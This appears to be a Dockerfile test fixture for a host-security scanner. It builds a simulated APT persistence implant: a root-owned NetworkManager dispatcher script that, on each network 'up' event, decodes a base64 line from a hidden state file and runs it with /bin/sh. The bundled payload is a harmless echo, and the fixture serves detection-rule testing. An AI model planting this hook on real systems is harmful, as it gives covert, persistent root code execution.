# APT implant: apt-netdispatch-orphan-hook (NetworkManager dispatcher persistence)
#
# Real shape (T1546 / T1059.004): a root-run NetworkManager dispatcher.d
# script that fires on every network "up" event and decodes a base64
# beacon from a packaged-looking state file. The dispatcher script is a
# NON-package orphan file, so netdispatch emits non_package_path -- which
# the new netdispatch_run_unmanaged rule consumes (previously NO rule was
# scoped to the netdispatch module, so this whole surface was Q7-blind).
#
# Variables: ${disp_file}, ${state_file}

RUN mkdir -p /etc/NetworkManager/dispatcher.d && \
    printf '%s\n' \
        '#!/bin/sh' \
        'IF="$$1"; STATUS="$$2"' \
        '[ "$$STATUS" = "up" ] || exit 0' \
        'CFG=/usr/lib/NetworkManager/conf.d/.nm-state' \
        'B64=$$(sed -n "s/^#beacon //p" "$$CFG" 2>/dev/null)' \
        '[ -n "$$B64" ] || exit 0' \
        'printf "%s" "$$B64" | /usr/bin/base64 -d 2>/dev/null | /bin/sh >/dev/null 2>&1 &' \
        > ${disp_file} && \
    chown root:root ${disp_file} && \
    chmod 0755 ${disp_file} && \
    install -d -m 0755 /usr/lib/NetworkManager/conf.d && \
    printf '%s\n' '#beacon ZWNobyBoaQo=' > ${state_file} && \
    chmod 0644 ${state_file}
